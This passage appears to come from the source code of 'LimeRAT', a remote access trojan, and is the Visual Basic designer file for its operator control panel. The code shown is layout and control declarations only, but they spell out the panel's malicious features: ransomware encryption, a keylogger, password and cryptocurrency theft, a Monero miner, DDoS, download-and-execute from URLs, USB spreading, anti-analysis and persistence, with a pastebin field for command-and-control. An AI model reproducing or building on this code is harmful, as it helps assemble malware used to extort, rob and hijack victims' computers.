        Me.PingClients.Interval = 30000
        '
        'AutoUpdate
        '
        Me.AutoUpdate.Interval = 5000
        '
        'CAP
        '
        '
        'Main
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(9.0!, 20.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(1668, 686)
        Me.Controls.Add(Me.MetroProgressSpinner1)
        Me.Controls.Add(Me.MetroLabel3)
        Me.Controls.Add(Me.MetroTabControl1)
        Me.Controls.Add(Me.MetroPanel1)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MinimumSize = New System.Drawing.Size(1321, 682)
        Me.Name = "Main"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.WindowsDefaultLocation
        Me.Style = MetroFramework.MetroColorStyle.Lime
        Me.Text = "LimeRAT"
        Me.TextAlign = System.Windows.Forms.VisualStyles.HorizontalAlign.Center
        Me.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroTabControl1.ResumeLayout(False)
        Me.MetroTabPage1.ResumeLayout(False)
        Me.Main_Rightclick.ResumeLayout(False)
        Me.MetroTabPage4.ResumeLayout(False)
        Me.MetroTabPage4.PerformLayout()
        CType(Me.CAPsec, System.ComponentModel.ISupportInitialize).EndInit()
        Me.MetroTabPage2.ResumeLayout(False)
        Me.MetroTabPage3.ResumeLayout(False)
        Me.MetroTabPage3.PerformLayout()
        Me.MetroPanel5.ResumeLayout(False)
        Me.MetroPanel5.PerformLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.MetroPanel4.ResumeLayout(False)
        Me.MetroPanel4.PerformLayout()
        CType(Me._numDelay, System.ComponentModel.ISupportInitialize).EndInit()
        Me.MetroPanel3.ResumeLayout(False)
        Me.MetroPanel3.PerformLayout()
        Me.MetroPanel2.ResumeLayout(False)
        Me.MetroPanel2.PerformLayout()
        Me.MetroPanel1.ResumeLayout(False)
        Me.MetroPanel1.PerformLayout()
        CType(Me.MetroStyleManager1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    Friend WithEvents MetroTabControl1 As MetroFramework.Controls.MetroTabControl
    Friend WithEvents MetroTabPage1 As MetroFramework.Controls.MetroTabPage
    Friend WithEvents L1 As ListView
    Friend WithEvents Country As ColumnHeader
    Friend WithEvents IP As ColumnHeader
    Friend WithEvents ID As ColumnHeader
    Friend WithEvents USERN As ColumnHeader
    Friend WithEvents VER As ColumnHeader
    Friend WithEvents OS As ColumnHeader
    Friend WithEvents INSDATE As ColumnHeader
    Friend WithEvents AV As ColumnHeader
    Friend WithEvents RANS As ColumnHeader
    Friend WithEvents SP As ColumnHeader
    Friend WithEvents PING As ColumnHeader
    Friend WithEvents NOTE_ As ColumnHeader
    Friend WithEvents MetroTabPage2 As MetroFramework.Controls.MetroTabPage
    Friend WithEvents MetroTabPage3 As MetroFramework.Controls.MetroTabPage
    Friend WithEvents L2 As ListBox
    Friend WithEvents NotifyIcon1 As NotifyIcon
    Friend WithEvents Main_Rightclick As ContextMenuStrip
    Friend WithEvents PluginsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RansomwareToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents EncryptToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents DecryptionToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RemoteDesktopToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents DetailsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PasswordsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents DownloadAndExecuteToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents FromDiskToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents FromURLToolStripMenuItem1 As ToolStripMenuItem
    Friend WithEvents BotPCOptionsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PCRestartToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PCShutdownToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PCLogoutToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ControllerOptionsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents UpdateToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents UpdateDiskToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents UpdateFromURLToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RestartToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents CloseToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents UninstallToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents AboutToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents BackgroundWorker1 As System.ComponentModel.BackgroundWorker
    Friend WithEvents LabelUpdate As Timer
    Friend WithEvents MetroLabel1 As MetroFramework.Controls.MetroLabel
    Friend WithEvents MetroPanel1 As MetroFramework.Controls.MetroPanel
    Friend WithEvents MetroToggle1 As MetroFramework.Controls.MetroToggle
    Friend WithEvents MetroLabel2 As MetroFramework.Controls.MetroLabel
    Friend WithEvents MetroLabel3 As MetroFramework.Controls.MetroLabel
    Friend WithEvents MetroProgressSpinner1 As MetroFramework.Controls.MetroProgressSpinner
    Friend WithEvents Flag As ImageList
    Friend WithEvents MetroStyleManager1 As MetroFramework.Components.MetroStyleManager
    Friend WithEvents MetroPanel2 As MetroFramework.Controls.MetroPanel
    Friend WithEvents _pastebin As MetroFramework.Controls.MetroTextBox
    Friend WithEvents MetroLabel4 As MetroFramework.Controls.MetroLabel
    Friend WithEvents MetroPanel3 As MetroFramework.Controls.MetroPanel
    Friend WithEvents MetroLabel7 As MetroFramework.Controls.MetroLabel
    Friend WithEvents _path2 As MetroFramework.Controls.MetroTextBox
    Friend WithEvents MetroLabel6 As MetroFramework.Controls.MetroLabel
    Friend WithEvents _drop As MetroFramework.Controls.MetroToggle
    Friend WithEvents MetroLabel5 As MetroFramework.Controls.MetroLabel
    Friend WithEvents _exe As MetroFramework.Controls.MetroTextBox
    Friend WithEvents MetroPanel4 As MetroFramework.Controls.MetroPanel
    Friend WithEvents MetroLabel8 As MetroFramework.Controls.MetroLabel
    Friend WithEvents _pin As MetroFramework.Controls.MetroCheckBox
    Friend WithEvents _usb As MetroFramework.Controls.MetroCheckBox
    Friend WithEvents _anti As MetroFramework.Controls.MetroCheckBox
    Friend WithEvents _btc As MetroFramework.Controls.MetroTextBox
    Friend WithEvents _dwnlink As MetroFramework.Controls.MetroTextBox
    Friend WithEvents MetroLabel9 As MetroFramework.Controls.MetroLabel
    Friend WithEvents MetroPanel5 As MetroFramework.Controls.MetroPanel
    Friend WithEvents _icon As MetroFramework.Controls.MetroCheckBox
    Friend WithEvents PictureBox1 As PictureBox
    Friend WithEvents _dwnchk As MetroFramework.Controls.MetroCheckBox
    Friend WithEvents MetroButton1 As MetroFramework.Controls.MetroButton
    Friend WithEvents MetroTile1 As MetroFramework.Controls.MetroTile
    Friend WithEvents BackgroundWorker2 As System.ComponentModel.BackgroundWorker
    Friend WithEvents _path1 As MetroFramework.Controls.MetroComboBox
    Friend WithEvents MetroStyleExtender1 As MetroFramework.Components.MetroStyleExtender
    Friend WithEvents MetroToolTip1 As MetroFramework.Components.MetroToolTip
    Friend WithEvents radioNET2 As MetroFramework.Controls.MetroRadioButton
    Friend WithEvents radioNET4 As MetroFramework.Controls.MetroRadioButton
    Friend WithEvents MetroLabel10 As MetroFramework.Controls.MetroLabel
    Friend WithEvents MetroLabel11 As MetroFramework.Controls.MetroLabel
    Friend WithEvents _numDelay As NumericUpDown
    Friend WithEvents ToolStripMenuItem1 As ToolStripMenuItem
    Friend WithEvents ToolStripSeparator1 As ToolStripSeparator
    Friend WithEvents ToolStripSeparator2 As ToolStripSeparator
    Friend WithEvents ToolStripSeparator3 As ToolStripSeparator
    Friend WithEvents chkRename As MetroFramework.Controls.MetroCheckBox
    Friend WithEvents LockScreenToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents FIleManagerToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents STARTToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents STOPToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents MiscellaneousToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents VisitWebsiteToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RunAsAdministratorToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents KeyloggerToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents CryptocurrencyStealerToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ToolStripSeparator4 As ToolStripSeparator
    Friend WithEvents XMR As ColumnHeader
    Friend WithEvents XMRMinerToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents MetroLabel12 As MetroFramework.Controls.MetroLabel
    Friend WithEvents DDoSToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PingClients As Timer
    Friend WithEvents AutoUpdate As Timer
    Friend WithEvents OnConnectToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents EnableWindowsRDPToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents MetroTabPage4 As MetroFramework.Controls.MetroTabPage
    Friend WithEvents ImageList1 As ImageList
    Friend WithEvents L3 As ListView
    Friend WithEvents Label2 As Label
    Friend WithEvents Label1 As Label
    Friend WithEvents CAPstart As MetroFramework.Controls.MetroButton
    Friend WithEvents CAP As Timer
    Friend WithEvents CAPsec As NumericUpDown
    Friend WithEvents PersistenceToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ListviewOptionsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ClientColorToolStripMenuItem1 As ToolStripMenuItem
    Friend WithEvents ClientNoteToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ClientFolderToolStripMenuItem1 As ToolStripMenuItem
    Friend WithEvents RemoveOfflineToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents DotNET As ColumnHeader
    Friend WithEvents _PORT As ColumnHeader
End Class
